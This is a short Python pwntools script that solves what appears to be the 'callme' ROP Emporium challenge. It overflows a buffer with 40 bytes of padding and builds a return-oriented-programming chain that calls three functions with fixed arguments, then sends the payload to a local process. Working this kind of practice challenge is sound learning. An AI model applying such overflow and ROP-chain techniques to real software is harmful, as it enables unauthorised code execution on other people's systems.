#!/usr/bin/env python
from pwn import *

#setup pwntools to work with binary
elf = context.binary = ELF('callme')
io = process(elf.path)

#memory addresses
callme_one = 0x400720
callme_two = 0x400740
callme_three = 0x4006f0
gadget = 0x40093c
one = 0xdeadbeefdeadbeef
two = 0xcafebabecafebabe
three = 0xd00df00dd00df00d

# exploit crafting
# buf = ""
# buf += 'A'*40
# buf += p64(gadget) + p64(one) + p64(two) + p64(three) + p64(callme_one)
# buf += p64(gadget) + p64(one) + p64(two) + p64(three) + p64(callme_two)
# buf += p64(gadget) + p64(one) + p64(two) + p64(three) + p64(callme_three)

rop = ROP(elf)
rop.callme_one(one, two, three)
rop.callme_two(one, two, three)
rop.callme_three(one, two, three)
print "ROP Dump: \n" + (rop.dump())
buf = 'A'*40 + rop.chain()

print len(buf)

# sending payload
io.sendline(buf)
io.interactive()